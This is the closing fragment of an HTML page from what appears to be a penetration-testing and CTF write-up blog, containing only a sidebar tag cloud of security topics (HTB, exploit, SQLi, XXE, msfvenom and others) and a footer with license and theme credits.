              <a href="../../tag/jwt.html">jwt</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openemr.html">openEMR</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/android.html">Android</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/core-dump.html">core dump</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xxe.html">XXE</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/cve.html">CVE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nano.html">nano</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxd.html">lxd</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/misc.html">misc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/memcache.html">memcache</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/challenge.html">challenge</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/reverse.html">reverse</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/tomcat.html">tomcat</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ldap.html">LDAP</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/screen.html">screen</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/net.html">.NET</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nmap.html">nmap</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/blog.html">blog</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/logrotate.html">logrotate</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/gdbserver.html">gdbserver</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adminer.html">adminer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vnc.html">VNC</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/web.html">web</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sqli.html">SQLi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/azure.html">Azure</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/msfvenom.html">msfvenom</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssti.html">SSTI</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cloudme.html">cloudme</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/exploit.html">exploit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/metasploit.html">metasploit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/php-filter.html">php filter</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/winrm.html">winrm</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/htb.html">HTB</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lfi.html">lfi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/splunk.html">Splunk</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/composer.html">composer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/strapi.html">strapi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/msfconsole.html">msfconsole</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/windows.html">windows</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/deserialization.html">deserialization</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/javascript.html">javascript</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssrf.html">SSRF</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phishing.html">phishing</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/bludit.html">bludit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/gitlab.html">gitlab</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/vulnhub.html">vulnhub</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nosql.html">NoSQL</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chef.html">chef</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/teamviewer.html">teamviewer</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/boot2root.html">boot2root</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/crypto.html">Crypto</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/ctf.html">CTF</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxc.html">lxc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pypi.html">pypi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/path.html">PATH</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cewl.html">cewl</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/php.html">php</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/print-nightmare.html">print nightmare</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/python.html">python</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/re.html">RE</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/vault.html">vault</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/programming.html">programming</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/git.html">git</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nft.html">NFT</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xss.html">XSS</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dll.html">DLL</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/webassembly.html">webassembly</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/umbraco.html">umbraco</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openbsd.html">OpenBSD</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/openadmin.html">openAdmin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/jackson.html">jackson</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chisel.html">chisel</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vb.html">VB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/zip.html">zip</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/wordpress.html">wordpress</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adb.html">adb</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/yaml.html">YAML</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/rsa.html">RSA</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/enumeration.html">enumeration</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/upload.html">Upload</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/john.html">john</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phs.html">PHS</a>
            </li>
    </ul>
</section>

            </div>
        </aside>
    </div>

    <section class="pure-g-r footer">
<div class="pure-u-2-3 copyright">
    <p class="l-box">
        The content of this blog in under
        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.

        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
    </p>
</div>

<div class="pure-u-1-3 credits">
    <p class="l-box">
        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
    </p>
</div>    </section>


</div>
</body>
</html>